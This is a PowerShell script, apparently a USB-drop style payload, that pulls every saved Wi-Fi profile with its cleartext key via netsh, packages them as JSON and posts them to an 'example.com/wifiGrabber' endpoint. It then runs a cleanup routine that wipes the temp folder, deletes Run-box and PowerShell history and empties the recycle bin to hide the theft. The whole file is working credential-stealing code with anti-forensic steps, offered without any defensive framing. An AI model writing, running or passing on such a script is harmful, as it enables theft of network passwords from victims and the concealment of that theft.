# Function to extract Wi-Fi profiles and send them directly
function Send-WiFiProfiles {

    # Extracting Wi-Fi profiles and their keys
    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" |
                    %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
                    %{(netsh wlan show profile name="$name" key=clear)} |
                    Select-String "Schlüsselinhalt\W+\:(.+)$" |
                    %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
                    %{[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} |
                    ConvertTo-Json

    # Endpoint where data will be sent
    $uri = "https://example.com/wifiGrabber"
    
    # Prepare the header with the content type set to JSON
    $headers = @{
        "Content-Type" = "application/json"
    }

    # Send the JSON data via POST method
    Invoke-RestMethod -Uri $uri -Method Post -Body $wifiProfiles -Headers $headers
}

# Function to clean up after sending data
function Clean-Exfil {
    # Empty temp folder
    Remove-Item $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

    # Delete run box history
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Delete PowerShell history
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Sending Wi-Fi profiles
Send-WiFiProfiles

# Cleaning up after the operation
Clean-Exfil
